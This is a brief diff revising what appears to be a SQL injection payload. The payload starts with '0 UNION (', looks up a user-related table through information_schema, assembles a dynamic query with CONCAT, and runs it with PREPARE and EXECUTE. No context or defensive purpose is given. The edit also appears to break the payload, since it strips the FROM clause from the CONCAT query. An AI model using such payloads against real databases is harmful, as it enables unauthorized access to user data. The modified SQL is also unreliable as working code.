@@ -1,3 +1,7 @@
+SELECT table_name
+FROM information_schema.TABLES
+WHERE table_name LIKE '%usr%' LIMIT 1;
+
 0 UNION (
 SELECT CONCAT(
     'SELECT ',
@@ -8,8 +12,7 @@ SELECT CONCAT(
     ' = 322695107'
 )
 INTO @sql
-FROM information_schema.TABLES t
-WHERE TABLE_NAME LIKE '%usr%' LIMIT 1;
+
 
 PREPARE stmt FROM @sql;
 EXECUTE stmt;
